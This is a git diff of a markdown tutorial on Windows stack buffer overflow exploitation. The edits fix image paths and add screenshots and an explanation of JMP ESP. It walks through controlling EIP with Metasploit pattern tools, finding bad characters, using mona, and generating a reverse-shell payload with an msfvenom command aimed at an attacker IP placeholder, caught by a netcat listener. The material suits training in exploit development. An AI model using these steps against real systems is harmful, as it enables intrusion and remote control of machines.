@@ -27,7 +27,7 @@ The EIP (Extended Instruction Pointer) register controls the execution flow of t
 The ESP (Extended Stack Pointer) is an indirect memory operand pointing to the top of the stack. This is the point where the instructions that use the stack, actually use it.
 
 Here are a view of these values in Immunity
-![EIP & ESP Example](/asssets/images/eip_esp_example.jpg)
+![EIP & ESP Example](/assets/images/eip_esp_example.jpg)
 
 There are two basic tactics when attempting at controlling the EIP
 Binary Tree Analysis (manual way) - essentially you split the buffer in a series of same characterws until you notice the EIP getting over-written
@@ -42,7 +42,7 @@ Naturally you are going to want to use the Unique String Method whenever possibl
   - Usage: `pattern\_create.rb 2200` <-- size of your buffer
 - Place the output inside your script
 - Run script and locate EIP's bytes
-![EIP](/asssets/images/eip.jpg)
+![EIP](/assets/images/eip.jpg)
 - Use pattern\_offset.rb to find the position from your pattern\_create script
   - Usage: `pattern-offset.rb 13731415` <--EIP value from crash
 - It should return your location (something like 1403). This means that on the 1404th byte is where you can direct EIP. A good way to test this is to send a certain amount of A&#39;s, B&#39;s, and C&#39;s to see where the values are located
@@ -77,7 +77,7 @@ To me this can be the most frustrating part of the process and often where peopl
 - Remove the character from the buffer and continue until you&#39;ve completed them all
 
 Example
-![Bad Characters](assets/images/badchars.jpg)
+![Bad Characters](/assets/images/badchars.jpg)  
 
 **Redirect EIP**
 
@@ -88,14 +88,19 @@ When the application starts each time you&#39;ll notice that your pointers are a
   - Search for jmp esp in the whole DLL
   - If you can&#39;t find one then the nasm\_shell command is FFE4 and you should search for that using mona.py
     - Usage: `!mona find –s "\xff\xe4" –m <vulnerable module>`  
+    - ![Mona](/assets/images/mona.jpg)  
   - Test and place the location within your fuzzer
+  - ![JMP ESP](/assets/images/jmp_esp.jpg)  
+
+By redirecting the EIP to our newly found address, at the time of the crash, a JMP ESP instruction will be executed, which will lead the execution flow into our shellcode
 
 **Generate Shellcode**
 
-Your shell code can be just about anything malicious that you want to do on the asset, but its typically used for returning a shell (but don&#39;t forget about other options like adding users, altering data, etc.,.). A basic tool to help with generating shellcode is msfvenom which is part of the Metasploit framework.
+Your shell code can be just about anything malicious that you want to do on the asset, but its typically used for returning a shell (but don&#39;t forget about other options like adding users, altering data, etc.). A basic tool to help with generating shellcode is msfvenom which is part of the Metasploit framework.
 
 - In our example we&#39;re going to use a reverse shell and encode it with shikata\_ga\_nai (I highly recommend to explore some of the other encoders as they may be the only options with your bad characters combination)
   - Usage:  `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT NUMBER> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "<BAD CHARACTERS>`  
+![Shellcode](/assets/images/shellcode.jpg)  
 - Make note of the size of your shellcode as you&#39;ll need to account for it and ensure that you have the proper space
 - Within your fuzzer, place a few NOP&#39;s (\x90) before the shellcode to ensure it has enough room to decode and it won&#39;t trip over itself
 
@@ -106,3 +111,4 @@ You&#39;re ready to fire off your exploit! I recommend setting a breakpoint at t
 - Set up a listener on the port number that you chose
   - Usage: `nc –lvp <PORT NUMBER>`  
 - Fire off your script and if everything works right you should be presented with a reverse shell from your target
+![Reverse Shell](/assets/images/shell.jpg)  
